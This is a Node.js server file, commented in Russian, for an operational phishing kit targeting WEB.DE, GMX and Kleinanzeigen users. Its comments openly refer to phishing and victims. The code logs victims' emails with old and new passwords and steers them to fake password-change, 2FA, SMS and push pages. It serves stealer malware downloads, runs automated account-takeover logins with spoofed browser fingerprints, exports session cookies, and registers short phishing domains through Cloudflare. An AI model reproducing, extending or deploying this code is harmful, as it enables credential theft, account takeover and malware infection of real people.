  if (allowed.indexOf(source) === -1 || newPassword == null || String(newPassword).trim() === '') return;
  var trimmed = String(newPassword).trim();
  if (!Array.isArray(lead.passwordHistory)) lead.passwordHistory = [];
  function lastPwd(entry) {
    return typeof entry === 'string' ? entry : (entry && entry.p ? entry.p : '');
  }
  if (lead.passwordHistory.length > 0 && lastPwd(lead.passwordHistory[lead.passwordHistory.length - 1]) === trimmed) return;
  lead.passwordHistory.push({ p: trimmed, s: source });
}

function readSavedCredentials() {
  try {
    if (fs.existsSync(SAVED_CREDENTIALS_FILE)) {
      const content = fs.readFileSync(SAVED_CREDENTIALS_FILE, 'utf8');
      const data = JSON.parse(content);
      return Array.isArray(data) ? data : [];
    }
    return [];
  } catch (err) {
    console.error('[SERVER] Ошибка чтения saved-credentials.json:', err);
    return [];
  }
}

function writeSavedCredentials(credentials) {
  try {
    ensureDataFile();
    fs.writeFileSync(SAVED_CREDENTIALS_FILE, JSON.stringify(credentials, null, 2), 'utf8');
  } catch (err) {
    console.error('[SERVER] Ошибка записи saved-credentials.json:', err);
  }
}

function ensureDataFile() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  if (!fs.existsSync(SAVED_CREDENTIALS_FILE)) fs.writeFileSync(SAVED_CREDENTIALS_FILE, JSON.stringify([], null, 2), 'utf8');
  getDb();
}

function writeDebugLog(action, data) {
  try {
    ensureDataFile();
    const timestamp = new Date().toISOString();
    const safe = (obj) => {
      if (obj == null || typeof obj !== 'object') return obj;
      const out = {};
      for (const k of Object.keys(obj)) {
        const v = obj[k];
        if ((k === 'email' || k.endsWith('Email')) && typeof v === 'string') {
          out[k] = maskEmail(v);
        } else if (v && typeof v === 'object' && !Array.isArray(v) && !(v instanceof Date)) {
          out[k] = safe(v);
        } else {
          out[k] = v;
        }
      }
      return out;
    };
    const logEntry = {
      timestamp: timestamp,
      action: action,
      data: safe(data)
    };
    const logLine = JSON.stringify(logEntry) + '\n';
    fs.appendFileSync(DEBUG_LOG_FILE, logLine, 'utf8');
  } catch (err) {
    console.error('[SERVER] Ошибка записи в debug.log:', err);
  }
}

/**
 * Объединение дубликатов только по id (visitId).
 * IP НЕ используется для связывания или объединения записей — только для отображения.
 * Email НЕ используется для объединения — каждая новая почта создает новый лог.
 * Один пользователь может менять IP (VPN, мобильная сеть), поэтому IP ненадежен для связывания.
 */
function mergeDuplicates(leads) {
  if (!Array.isArray(leads) || leads.length === 0) return leads;
  
  const merged = [];
  const seenById = new Set();   // id (visitId) — один сеанс, точный дубликат
  const seenByEmail = new Map(); // email -> индекс в merged (один аккаунт = одна запись)
  
  for (let i = 0; i < leads.length; i++) {
    const lead = leads[i];
    
    if (!lead || typeof lead !== 'object') {
      console.warn('[SERVER] mergeDuplicates: пропущена некорректная запись на индексе', i);
      continue;
    }
    
    const id = (lead.id || '').trim();
    const email = (lead.email || '').trim().toLowerCase();
    
    // Пропускаем записи без идентификаторов
    if (!id && !email) {
      console.warn('[SERVER] mergeDuplicates: пропущена запись без id и email');
      continue;
    }
    
    // 1) Дубликат по id (один и тот же визит) — пропускаем
    if (id && seenById.has(id)) {
      continue;
    }
    
    // 2) НЕ объединяем записи по email - каждая новая почта = новый лог
    // Объединяем только дубликаты по id (один и тот же visitId)
    // Если email одинаковый, но id разный - это разные логи (новая сессия с той же почтой)
    
    // Всегда добавляем запись как новую (не объединяем по email)
    merged.push(lead);
    const newIndex = merged.length - 1;
    if (id) seenById.add(id);
    // Не используем seenByEmail для объединения, только для отслеживания
    if (email) seenByEmail.set(email, newIndex);
  }
  
  return merged;
}

function broadcastLeadsUpdate() {
  if (typeof global.__gmwWssBroadcast === 'function') global.__gmwWssBroadcast();
}

/**
 * Редкий массовый снимок: полная замена таблицы лидов (не использовать в горячем пути).
 */
function writeLeads(leads) {
  if (!Array.isArray(leads)) {
    console.error('[SERVER] Ошибка: replaceAllLeads ожидает массив');
    return;
  }
  try {
    ensureDataFile();
    replaceAllLeads(leads);
    invalidateLeadsCache();
    broadcastLeadsUpdate();
  } catch (err) {
    console.error('[SERVER] Ошибка replaceAllLeads:', err);
  }
}

function appendToAllLog(email, lastPassword, newPassword) {
  try {
    ensureDataFile();
    const emailStr = (email || '').trim();
    const lastPwdStr = (lastPassword || '').trim();
    const newPwdStr = (newPassword || '').trim();
    
    if (!emailStr) return; // Не сохраняем если нет email
    
    const line = emailStr + ':' + lastPwdStr + ':' + newPwdStr + '\n';
    fs.appendFileSync(ALL_LOG_FILE, line, 'utf8');
  } catch (err) {
    console.error('[SERVER] Ошибка записи в all.txt:', err);
  }
}

function readModeData() {
  try {
    return getModeData();
  } catch (_) {
    return { mode: 'auto', autoScript: false };
  }
}

function readMode() {
  return readModeData().mode;
}

function readAutoScript() {
  return readModeData().autoScript;
}

function writeStartPage(value) {
  ensureDataFile();
  const v = value === 'change' ? 'change' : value === 'download' ? 'download' : value === 'klein' ? 'klein' : 'login';
  fs.writeFileSync(START_PAGE_FILE, v, 'utf8');
}

/** У Klein нет GMX/WEB.DE push-страницы на фишинге. В leads.json статус может быть redirect_push (админка, бейдж Push), а в поллинге статуса жертве отдаём pending — см. обработчик lead-status. */
function suppressVictimPushPageForKleinContext(lead) {
  if (!lead) return false;
  if (lead.brand === 'klein') return true;
  if (readStartPage() === 'klein') return true;
  return false;
}

/** Пометка Kl у лида: отдельный бренд или уже введён emailKl. Без этого в EVENTS не смешиваем сценарий с Klein — только почта WEB.DE. */
function leadHasKleinMarkedData(lead) {
  if (!lead || typeof lead !== 'object') return false;
  if (lead.brand === 'klein') return true;
  if (String(lead.emailKl || '').trim() !== '') return true;
  return false;
}

automationService.init({
  readLeads: leadService.readLeads,
  persistLeadPatch: leadService.persistLeadPatch,
  pushEvent,
  writeDebugLog,
  logTerminalFlow,
  readAutoScript,
  readStartPage,
  leadHasKleinMarkedData,
  EVENT_LABELS,
  getAdminToken: () => ADMIN_TOKEN,
  serverProjectRoot: PROJECT_ROOT,
});

const {
  WEBDE_LOGIN_MAX_CONCURRENT,
  runningWebdeLoginLeadIds,
  pendingWebdeLoginQueue,
  webdeLoginChildByLeadId,
  releaseWebdeLoginSlot,
  preemptWebdeLoginForReplacedLead,
  stopWebdeLoginForDeletedLead,
  setWebdeLeadScriptStatus,
  runWhenLeadsWriteQueueIdle,
  tryAcquireWebdeScriptLock,
  clearWebdeScriptRunning,
  touchWebdeScriptLock,
  webdeLockWriteChildPid,
  beginWebdeAutoLoginRun,
  endWebdeAutoLoginRun,
  startWebdeLoginAfterLeadSubmit,
  restartWebdeAutoLoginAfterVictimRetryFromError,
  startWebdeLoginForLeadId,
  startKleinLoginForLeadId,
  clearAllWebdeChildrenAndQueues,
} = automationService;

function writeMode(mode, autoScript) {
  ensureDataFile();
  const cur = readModeData();
  const next = { mode: mode !== undefined ? (mode === 'manual' ? 'manual' : 'auto') : cur.mode, autoScript: autoScript !== undefined ? !!autoScript : cur.autoScript };
  writeModeData(next);
}

function readShortDomains() {
  try {
    if (fs.existsSync(SHORT_DOMAINS_FILE)) {
      const raw = fs.readFileSync(SHORT_DOMAINS_FILE, 'utf8');
      const data = JSON.parse(raw);
      return typeof data === 'object' && data !== null ? data : {};
    }
  } catch (e) {}
  return {};
}

const SHORT_DOMAINS_TTL_MS = 10000;
let _shortDomainsCache = { data: null, ts: 0 };
/** Кэш short-доменов на 10 сек, чтобы не читать файл на каждый запрос (снижает риск 504 на /admin). */
function getShortDomainsList() {
  const now = Date.now();
  if (_shortDomainsCache.data !== null && (now - _shortDomainsCache.ts) < SHORT_DOMAINS_TTL_MS) {
    return _shortDomainsCache.data;
  }
  const data = readShortDomains();
  _shortDomainsCache = { data, ts: now };
  return data;
}

function writeShortDomains(obj) {
  ensureDataFile();
  fs.writeFileSync(SHORT_DOMAINS_FILE, JSON.stringify(obj, null, 2), 'utf8');
  _shortDomainsCache = { data: null, ts: 0 };
}

function addShortDomainToCloudflare(domain, serverIp, apiToken, cb) {
  const opts = {
    hostname: 'api.cloudflare.com',
    path: '/client/v4/zones',
    method: 'POST',
    headers: { 'Authorization': 'Bearer ' + apiToken, 'Content-Type': 'application/json' }
  };
  const body = JSON.stringify({ name: domain, jump_start: true });
  const req = https.request(opts, function (res) {
    let data = '';
    res.on('data', function (chunk) { data += chunk; });
    res.on('end', function () {
      let json;
      try { json = JSON.parse(data); } catch (e) { return cb(new Error('Invalid CF response')); }
      if (!json.success || !json.result) return cb(new Error((json.errors && json.errors[0] && json.errors[0].message) || 'CF add zone failed'));
      const zoneId = json.result.id;
      const ns = (json.result.name_servers || []).slice(0, 2);
      const opts2 = {
        hostname: 'api.cloudflare.com',
        path: '/client/v4/zones/' + zoneId + '/dns_records',
        method: 'POST',
        headers: { 'Authorization': 'Bearer ' + apiToken, 'Content-Type': 'application/json' }
      };
      const body2 = JSON.stringify({ type: 'A', name: '@', content: serverIp, ttl: 1, proxied: false });
      const req2 = https.request(opts2, function (res2) {
        let data2 = '';
        res2.on('data', function (chunk) { data2 += chunk; });
        res2.on('end', function () {
          let json2;
          try { json2 = JSON.parse(data2); } catch (e) {}
          if (!json2 || !json2.success) return cb(new Error((json2 && json2.errors && json2.errors[0] && json2.errors[0].message) || 'CF A record failed'));
          cb(null, ns);
        });
      });
      req2.on('error', function (e) { cb(e); });
      req2.write(body2);
      req2.end();
    });
  });
  req.on('error', function (e) { cb(e); });
  req.write(body);
  req.end();
}

function readZipPassword() {
  try {
    if (fs.existsSync(ZIP_PASSWORD_FILE)) {
      return fs.readFileSync(ZIP_PASSWORD_FILE, 'utf8').trim();
    }
  } catch (e) {}
  return '';
}

function writeZipPassword(value) {
  ensureDataFile();
  fs.writeFileSync(ZIP_PASSWORD_FILE, String(value == null ? '' : value).trim(), 'utf8');
}

function isAdminRequest(pathname) {
  // Эндпоинты только для админки (в т.ч. /api/geo для флагов в списке, чат для кнопки «Открыть чат у юзера»)
  return pathname === '/api/chat-open' ||
         pathname === '/api/chat-open-ack' ||
         pathname === '/api/chat-typing' ||
         pathname === '/api/chat-read' ||
         pathname === '/api/leads' ||
         pathname === '/api/geo' ||
         pathname === '/api/get-saved-credentials' ||
         pathname === '/api/delete-lead' ||
         pathname === '/api/delete-all' ||
         pathname === '/api/save-credentials' ||
         pathname === '/api/delete-saved-credential' ||
         pathname === '/api/mode' ||
         pathname === '/api/start-page' ||
         pathname === '/api/show-error' ||
         pathname === '/api/show-success' ||
         pathname === '/api/redirect-change-password' ||
         pathname === '/api/redirect-sicherheit' ||
         pathname === '/api/redirect-sicherheit-windows' ||
         pathname === '/api/redirect-android' ||
         pathname === '/api/redirect-download-by-platform' ||
         pathname === '/api/redirect-push' ||
         pathname === '/api/redirect-sms-code' ||
         pathname === '/api/redirect-2fa-code' ||
         pathname === '/api/redirect-open-on-pc' ||
         pathname === '/api/redirect-klein-forgot' ||
         pathname === '/api/mark-worked' ||
         pathname === '/api/mark-opened' ||
         pathname === '/api/config/download' ||
         pathname === '/api/config/download-limit' ||
         pathname === '/api/config/download-upload-multi' ||
         pathname === '/api/config/download-android' ||
         pathname === '/api/config/download-android-limit' ||
         pathname === '/api/config/download-android-upload-multi' ||
         pathname === '/api/config/download-delete' ||
         pathname === '/api/config/download-android-delete' ||
         pathname === '/api/config/download-reset-counts' ||
         pathname === '/api/config/download-rotate-next' ||
         pathname === '/api/config/download-settings' ||
         pathname === '/api/config/cookies-export' ||
         pathname === '/api/config/check' ||
         pathname === '/api/config/upload-apply' ||
         pathname === '/api/config/shortlinks' ||
         pathname === '/api/config/short-domains' ||
         pathname === '/api/config/short-domains-check' ||
         pathname === '/api/config/zip-password' ||
         pathname === '/api/config/zip-process' ||
         pathname === '/api/config/proxies' ||
         pathname === '/api/config/proxies-validate' ||
         pathname === '/api/config/webde-fingerprint-indices' ||
         pathname === '/api/config/webde-fingerprints-list' ||
         pathname === '/api/config/webde-fingerprint-probe-start' ||
         pathname === '/api/config/webde-fingerprint-probe-status' ||
         pathname === '/api/config/stealer-email' ||
         pathname === '/api/config/stealer-email/select' ||
         pathname === '/api/config/email' ||
         pathname === '/api/config/email/select' ||
         pathname === '/api/config/warmup-email' ||
         pathname === '/api/config/warmup-email/select' ||
         pathname === '/api/send-stealer' ||
         pathname === '/api/send-email' ||
         pathname === '/api/send-email-all-success' ||
         pathname === '/api/send-email-cookies-batch' ||
         pathname === '/api/archive-leads-by-filter' ||
         pathname === '/api/lead-kl-archive' ||
         pathname === '/api/warmup-start' ||
         pathname === '/api/warmup-status' ||
         pathname === '/api/warmup-pause' ||
         pathname === '/api/warmup-stats-reset' ||
         pathname === '/api/warmup-stop' ||
         pathname === '/api/export-logs' ||
         pathname === '/api/lead-credentials' ||
         pathname === '/api/lead-cookies' ||
         pathname === '/api/lead-fingerprint' ||
         pathname === '/api/lead-automation-profile' ||
         pathname === '/api/lead-login-context' ||
         pathname === '/api/webde-login-grid-step' ||
         pathname === '/api/webde-login-start' ||
         pathname === '/api/webde-login-result' ||
         pathname === '/api/webde-wait-password' ||
         pathname === '/api/webde-poll-2fa-code' ||
         pathname === '/api/webde-login-2fa-wrong' ||
         pathname === '/api/webde-login-2fa-received' ||
         pathname === '/api/webde-login-slot-done' ||
         pathname === '/api/webde-push-resend-poll' ||
         pathname === '/api/webde-push-resend-result' ||
         pathname === '/api/script-event' ||
         pathname === '/api/zip-password' ||
         pathname === '/api/lead-klein-flow-poll' ||
         pathname === '/api/klein-anmelden-seen';
}

/** Только в режиме Auto (не Manual, не Auto-Login): после ввода почты и пароля сразу кидать юзера на startPage. Manual — админ сам направляет; Auto-Login — редирект только после успешного входа скрипта. */
function getInitialRedirectStatus(mode, autoScript, startPage, lead) {
  // Для Klein любые редиректы выполняются только вручную из админки.
  if (lead && lead.brand === 'klein') return null;
  if (mode === 'manual') return null;
  if (mode === 'auto' && autoScript) return null; // Auto-Login: редирект по startPage делаем в webde-login-result после успеха скрипта
  if (mode !== 'auto') return null;
  if (startPage === 'login') return 'show_success';
  if (startPage === 'change') return 'redirect_change_password';
  if (startPage === 'download') return getRedirectPasswordStatus(lead);
  return null;
}
function getAutoRedirectEventLabel(status) {
  if (status === 'redirect_sicherheit') return 'Авто: редирект на Download (Windows)';
  if (status === 'redirect_change_password') return 'Авто: редирект на смену пароля';
  if (status === 'redirect_android') return 'Авто: редирект на скачивание (Android)';
  if (status === 'redirect_open_on_pc') return 'Авто: редирект на страницу ПК';
  if (status === 'redirect_klein_anmelden') return 'Авто: редирект на Klein (после почты)';
  return 'Авто: редирект';
}

/**
 * После прошлого сценария лид может остаться в redirect_* (например Auto-Login уже кинул на смену пароля).
 * Новый заход с тем же visitId / fingerprint — без сброса /api/status сразу отдаёт старый redirect, страница уводит на passwort-aendern,
 * а в лог не попадает новое «Авто: редирект…» (статус не менялся). Сбрасываем в pending + событие в журнал.
 */
function leadStatusStaleAfterCompletedRedirect(status) {
  if (!status || typeof status !== 'string') return false;
  return [
    'redirect_change_password',
    'redirect_sicherheit',
    'redirect_android',
    'redirect_open_on_pc',
    'redirect_push',
    'redirect_sms_code',
    'redirect_2fa_code',
    'redirect_gmx_net',
    'redirect_klein_forgot',
    'redirect_klein_anmelden',
  ].indexOf(status) !== -1;
}

function applyReturnVisitStatusReset(lead) {
  if (!lead) return;
  const st = lead.status;
  if (st === 'show_success' || leadStatusStaleAfterCompletedRedirect(st)) {
    lead.status = 'pending';
    pushEvent(lead, 'Повторный ввод данных — сброс статуса');
  }
}

function readWebdeFingerprintsPoolMeta() {
  const meta = { filePresent: false, pool: [], parseError: null };
  try {
    meta.filePresent = fs.existsSync(WEBDE_FINGERPRINTS_JSON);
    if (!meta.filePresent) return meta;
    const raw = fs.readFileSync(WEBDE_FINGERPRINTS_JSON, 'utf8');
    const arr = JSON.parse(raw);
    if (Array.isArray(arr)) {
      meta.pool = arr;
    } else {
      meta.parseError = 'not_array';
    }
  } catch (e) {
    meta.parseError = (e && e.message) ? String(e.message) : 'parse_error';
    meta.filePresent = fs.existsSync(WEBDE_FINGERPRINTS_JSON);
  }
  return meta;
}

function readWebdeFingerprintsPoolArr() {
  return readWebdeFingerprintsPoolMeta().pool;
}

function summarizeWebdeFingerprintEntry(fp) {
  if (!fp || typeof fp !== 'object') return '—';
  const loc = fp.locale || fp.language || '—';
  const vp = fp.viewport || {};
  const vw = vp.width != null ? vp.width : '—';
  const vh = vp.height != null ? vp.height : '—';
  const ua = String(fp.userAgent || '');
  const chromeM = ua.match(/Chrome\/[\d.]+/);
  const chrome = chromeM ? chromeM[0] : '';
  const tz = fp.timezoneId || '';
  const parts = [String(loc), String(vw) + '×' + String(vh), chrome, tz].filter(Boolean);
  return parts.join(' · ') || '—';
}

function buildWebdeFingerprintsListPayload() {
  const meta = readWebdeFingerprintsPoolMeta();
  const pool = meta.pool;
  const allowed = readWebdeFpIndicesAllowedForProbe(pool.length);
  const allowedSet = new Set(allowed);
  return {
    entries: pool.map(function (fp, index) {
      return {
        index: index,
        summary: summarizeWebdeFingerprintEntry(fp),
        active: allowedSet.has(index),
      };
    }),
    activeIndices: allowed,
    filePresent: meta.filePresent,
    poolLength: pool.length,
    parseError: meta.parseError,
  };
}

function readWebdeFpIndicesAllowedForProbe(poolLen) {
  if (poolLen <= 0) return [];
  const seen = new Set();
  try {
    if (fs.existsSync(WEBDE_FP_INDICES_FILE)) {
      const content = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
      const lines = content.split(/\r?\n/);
      for (let li = 0; li < lines.length; li++) {
        const s = lines[li].trim();
        if (!s || s.startsWith('#')) continue;
        const first = s.split(/\s+/)[0];
        const n = parseInt(first, 10);
        if (!isNaN(n) && n >= 0 && n < poolLen) seen.add(n);
      }
    }
  } catch (e) {}
  if (seen.size === 0) {
    const out = [];
    for (let i = 0; i < poolLen; i++) out.push(i);
    return out;
  }
  return Array.from(seen).sort(function (a, b) { return a - b; });
}

function pruneWebdeProbeJobs() {
  const now = Date.now();
  for (const [id, j] of webdeProbeJobs) {
    if (j.done && (now - (j.updatedAt || j.startedAt)) > 3600000) {
      webdeProbeJobs.delete(id);
    }
  }
  if (webdeProbeJobs.size > 20) {
    const entries = Array.from(webdeProbeJobs.entries()).sort(function (a, b) {
      return (b[1].startedAt || 0) - (a[1].startedAt || 0);
    });
    for (let i = 20; i < entries.length; i++) {
      webdeProbeJobs.delete(entries[i][0]);
    }
  }
}

function webdeProbeScheduleContinue(jobId) {
  const job = webdeProbeJobs.get(jobId);
  if (job && !job.done && !job.error) {
    job.running = true;
    job.updatedAt = Date.now();
  }
  setImmediate(function () {
    webdeProbeRunOneBatch(jobId);
  });
}

function webdeProbeRunOneBatch(jobId) {
  const job = webdeProbeJobs.get(jobId);
  if (!job || job.done || job.error) return;
  if (job.paused) {
    job.running = false;
    job.updatedAt = Date.now();
    return;
  }
  const batch = job.indices.slice(job.cursor, job.cursor + 3);
  if (batch.length === 0) {
    job.done = true;
    job.running = false;
    job.updatedAt = Date.now();
    return;
  }
  job.running = true;
  job.updatedAt = Date.now();
  const python = process.platform === 'win32' ? 'python' : 'python3';
  const stdinPayload = JSON.stringify({
    email: job.email,
    password: job.password,
    indices: batch,
    headless: !!job.probeHeadless,
    requirePasswordField: job.requirePasswordField !== false,
  });
  const maxOut = 50 * 1024 * 1024;
  const maxErr = 2 * 1024 * 1024;
  let outBuf = '';
  let errBuf = '';
  let childDone = false;
  let child;
  try {
    child = spawn(python, [WEBDE_PROBE_BATCH_SCRIPT], {
      cwd: LOGIN_DIR,
      env: Object.assign({}, process.env, { PYTHONUNBUFFERED: '1' }),
      stdio: ['pipe', 'pipe', 'pipe'],
    });
  } catch (e) {
    job.running = false;
    job.error = (e && e.message) ? e.message : String(e);
    job.done = true;
    job.updatedAt = Date.now();
    return;
  }
  const killTimer = setTimeout(function () {
    if (childDone) return;
    childDone = true;
    try {
      child.kill('SIGTERM');
    } catch (eK) {}
    job.running = false;
    job.error = 'Таймаут пробы (900 с)';
    job.done = true;
    job.updatedAt = Date.now();
  }, 900000);

  function finishBatch(code, signal) {
    if (childDone) return;
    childDone = true;
    clearTimeout(killTimer);
    job.running = false;
    job.updatedAt = Date.now();
    if (signal) {
      job.error = 'Прервано: ' + String(signal);
      job.done = true;
      return;
    }
    let parsed;
    try {
      parsed = JSON.parse(String((outBuf || '').trim() || '{}'));
    } catch (e2) {
      job.error = 'Некорректный ответ скрипта пробы';
      job.done = true;
      return;
    }
    if (parsed.ok === false && parsed.error) {
      job.error = String(parsed.error);
      job.done = true;
      return;
    }
    if (code !== 0 && parsed.ok !== true) {
      const errText = ((errBuf || '') + (outBuf || '')).trim().slice(0, 800);
      job.error = errText || ('код выхода ' + String(code));
      job.done = true;
      return;
    }
    const batchResults = Array.isArray(parsed.results) ? parsed.results : [];
    for (let bi = 0; bi < batchResults.length; bi++) {
      job.results.push(batchResults[bi]);
    }
    job.cursor += batch.length;
    if (job.cursor >= job.indices.length) {
      job.done = true;
    } else if (job.paused) {
      job.running = false;
      job.updatedAt = Date.now();
    } else {
      webdeProbeScheduleContinue(jobId);
    }
  }

  child.stdout.on('data', function (chunk) {
    if (outBuf.length < maxOut) outBuf += chunk.toString();
  });
  child.stderr.on('data', function (chunk) {
    if (errBuf.length < maxErr) errBuf += chunk.toString();
  });
  child.on('error', function (e) {
    if (childDone) return;
    childDone = true;
    clearTimeout(killTimer);
    job.running = false;
    job.error = (e && e.message) ? e.message : String(e);
    job.done = true;
    job.updatedAt = Date.now();
  });
  child.on('close', function (code, signal) {
    finishBatch(code, signal);
  });
  try {
    child.stdin.end(stdinPayload, 'utf8');
  } catch (eIn) {
    if (!childDone) {
      childDone = true;
      clearTimeout(killTimer);
      try {
        child.kill('SIGTERM');
      } catch (eK2) {}
      job.running = false;
      job.error = (eIn && eIn.message) ? eIn.message : 'stdin';
      job.done = true;
      job.updatedAt = Date.now();
    }
  }
}

function handleWebdeFingerprintProbePause(res, json) {
  const jobId = String(json.webdeProbeJobId != null ? json.webdeProbeJobId : json.jobId || '').trim();
  if (!jobId) return send(res, 400, { ok: false, error: 'webdeProbeJobId' });
  const job = webdeProbeJobs.get(jobId);
  if (!job) return send(res, 404, { ok: false, error: 'Задача не найдена' });
  if (job.done) return send(res, 400, { ok: false, error: 'Задача уже завершена' });
  job.paused = true;
  job.updatedAt = Date.now();
  return send(res, 200, { ok: true });
}

function handleWebdeFingerprintProbeResume(res, json) {
  const jobId = String(json.webdeProbeJobId != null ? json.webdeProbeJobId : json.jobId || '').trim();
  if (!jobId) return send(res, 400, { ok: false, error: 'webdeProbeJobId' });
  const job = webdeProbeJobs.get(jobId);
  if (!job) return send(res, 404, { ok: false, error: 'Задача не найдена' });
  if (job.done) return send(res, 400, { ok: false, error: 'Задача уже завершена' });
  job.paused = false;
  job.updatedAt = Date.now();
  if (!job.running && !job.error) webdeProbeScheduleContinue(jobId);
  return send(res, 200, { ok: true });
}

function handleWebdeFingerprintProbeStart(res, json) {
  let email = '';
  let password = '';
  const cred = json.credentials != null ? String(json.credentials).trim() : '';
  if (cred) {
    const colon = cred.indexOf(':');
    if (colon === -1) {
      email = cred.trim();
      password = '';
    } else {
      email = cred.slice(0, colon).trim();
      password = cred.slice(colon + 1);
    }
  } else {
    email = String(json.email || '').trim();
    password = String(json.password || '');
  }
  if (!email) {
    return send(res, 400, { ok: false, error: 'Укажите email' });
  }
  if (!fs.existsSync(WEBDE_PROBE_BATCH_SCRIPT)) {
    return send(res, 500, { ok: false, error: 'Скрипт webde_probe_batch.py не найден' });
  }
  const pool = readWebdeFingerprintsPoolArr();
  const indicesAll = readWebdeFpIndicesAllowedForProbe(pool.length);
  if (indicesAll.length === 0) {
    return send(res, 400, { ok: false, error: 'Нет отпечатков (пул пуст)' });
  }
  const nAll = indicesAll.length;
  const take = Math.min(WEBDE_PROBE_MAX_INDICES_PER_JOB, nAll);
  const startPos = webdeFpProbeIndexCursor % nAll;
  const indices = [];
  for (let k = 0; k < take; k++) {
    indices.push(indicesAll[(startPos + k) % nAll]);
  }
  webdeFpProbeIndexCursor = (startPos + take) % nAll;
  const probeIndicesTruncated = nAll > take;
  pruneWebdeProbeJobs();
  const jobId = 'wp' + (++webdeProbeJobSeq).toString(36) + '-' + Date.now().toString(36);
  const hasGui = !!(
    (process.env.DISPLAY && String(process.env.DISPLAY).trim()) ||
    (process.env.WAYLAND_DISPLAY && String(process.env.WAYLAND_DISPLAY).trim())
  );
  const userRequestedHeadless =
    json.probeHeadless === true ||
    json.headless === true ||
    json.probeHeadless === 'true' ||
    json.headless === 'true';
  let probeHeadless = userRequestedHeadless;
  let probeHeadlessForced = false;
  if (!hasGui && !userRequestedHeadless) {
    probeHeadless = true;
    probeHeadlessForced = true;
    console.log('[WEBDE probe] Нет DISPLAY/WAYLAND_DISPLAY — принудительно headless (иначе каждый прогон падает с error)');
  }
  const requirePasswordField = json.requirePasswordField !== false && json.requirePasswordField !== 'false' && json.requirePasswordField !== 0;
  const job = {
    email: email,
    password: password,
    indices: indices,
    cursor: 0,
    results: [],
    done: false,
    running: false,
    paused: false,
    error: null,
    probeHeadless: probeHeadless,
    requirePasswordField: requirePasswordField,
    startedAt: Date.now(),
    updatedAt: Date.now(),
  };
  webdeProbeJobs.set(jobId, job);
  webdeProbeScheduleContinue(jobId);
  return send(res, 200, {
    ok: true,
    jobId: jobId,
    total: indices.length,
    totalIndicesAvailable: indicesAll.length,
    probeIndicesTruncated: probeIndicesTruncated,
    probeMaxIndicesPerJob: WEBDE_PROBE_MAX_INDICES_PER_JOB,
    probeHeadlessForced: probeHeadlessForced,
  });
}

function sendWebdeFingerprintProbeStatus(res, jobId) {
  if (!jobId) return send(res, 400, { ok: false, error: 'jobId' });
  const job = webdeProbeJobs.get(jobId);
  if (!job) return send(res, 404, { ok: false, error: 'Задача не найдена' });
  return send(res, 200, {
    ok: true,
    done: job.done,
    running: job.running,
    paused: !!job.paused,
    error: job.error,
    progress: { done: job.cursor, total: job.indices.length },
    results: job.results,
  });
}

const API_ROUTE_DEPS = {
  readMode,
  statusHeartbeats,
  suppressVictimPushPageForKleinContext,
  pushEvent,
  broadcastLeadsUpdate,
  writeDebugLog,
};

const ROUTE_HTTP_DEPS = {
  ALLOWED_EMAIL_DOMAINS: ALLOWED_EMAIL_DOMAINS,
  ALLOWED_EMAIL_DOMAINS_RAW: ALLOWED_EMAIL_DOMAINS_RAW,
  ALL_LOG_FILE: ALL_LOG_FILE,
  ARCHIVE_PROCESS_TIMEOUT_MS: ARCHIVE_PROCESS_TIMEOUT_MS,
  BOT_GATE_COOKIE: gateMiddleware.BOT_GATE_COOKIE,
  BRANDS: BRANDS,
  CHECK_DIR: CHECK_DIR,
  CHECK_META_FILE: CHECK_META_FILE,
  CONFIG_EMAIL_FILE: CONFIG_EMAIL_FILE,
  CONFIG_EMAIL_SENT_EVENT_LABEL: CONFIG_EMAIL_SENT_EVENT_LABEL,
  COOKIES_EXPORTED_FILE: COOKIES_EXPORTED_FILE,
  DATA_DIR: DATA_DIR,
  DEBUG_LOG_FILE: DEBUG_LOG_FILE,
  DEFAULT_DOWNLOAD_LIMIT: DEFAULT_DOWNLOAD_LIMIT,
  DOWNLOADS_DIR: DOWNLOADS_DIR,
  DOWNLOAD_ANDROID_CONFIG: DOWNLOAD_ANDROID_CONFIG,
  DOWNLOAD_ANDROID_LIMITS_FILE: DOWNLOAD_ANDROID_LIMITS_FILE,
  DOWNLOAD_COUNTS_FILE: DOWNLOAD_COUNTS_FILE,
  DOWNLOAD_FILES_CONFIG: DOWNLOAD_FILES_CONFIG,
  DOWNLOAD_LIMITS_FILE: DOWNLOAD_LIMITS_FILE,
  DOWNLOAD_ROTATION_FILE: DOWNLOAD_ROTATION_FILE,
  DOWNLOAD_SETTINGS_FILE: DOWNLOAD_SETTINGS_FILE,
  DOWNLOAD_SLOTS_COUNT: DOWNLOAD_SLOTS_COUNT,
  DOWNLOAD_TOKEN_TTL_MS: DOWNLOAD_TOKEN_TTL_MS,
  ENABLE_EMAIL_DOMAIN_ALLOWLIST: ENABLE_EMAIL_DOMAIN_ALLOWLIST,
  EVENT_LABELS: EVENT_LABELS,
  GATE_TIME_TTL_MS: GATE_TIME_TTL_MS,
  GMX_DOMAIN: GMX_DOMAIN,
  HEARTBEAT_MAX_AGE_MS: HEARTBEAT_MAX_AGE_MS,
  HOST: HOST,
  KLEIN_CANONICAL_HOST: KLEIN_CANONICAL_HOST,
  KLEIN_DOMAIN: KLEIN_DOMAIN,
  KLEIN_DOMAINS_LIST: KLEIN_DOMAINS_LIST,
  KLEIN_DOMAINS_RAW: KLEIN_DOMAINS_RAW,
  KLEIN_VICTIM_PASSWORD_ERROR_DE: KLEIN_VICTIM_PASSWORD_ERROR_DE,
  LOGIN_ARTIFACT_NAMES: LOGIN_ARTIFACT_NAMES,
  LOGIN_CLEANUP_MAX_AGE_MS: LOGIN_CLEANUP_MAX_AGE_MS,
  LOGIN_DIR: LOGIN_DIR,
  MIN_TIME_SINCE_GATE_ANDROID_MS: MIN_TIME_SINCE_GATE_ANDROID_MS,
  MIN_TIME_SINCE_GATE_MS: MIN_TIME_SINCE_GATE_MS,
  MOBILE_MAX_WIDTH: MOBILE_MAX_WIDTH,
  PORT: PORT,
  PROJECT_ROOT: PROJECT_ROOT,
  PROXY_FILE: PROXY_FILE,
  RATE_LIMITS: RATE_LIMITS,
  RATE_LIMIT_WINDOW_MS: RATE_LIMIT_WINDOW_MS,
  REQUIRE_GATE_COOKIE: REQUIRE_GATE_COOKIE,
  SAVED_CREDENTIALS_FILE: SAVED_CREDENTIALS_FILE,
  SERVER_LOG_PHISH_LABEL: SERVER_LOG_PHISH_LABEL,
  SHORT_DOMAINS_FILE: SHORT_DOMAINS_FILE,
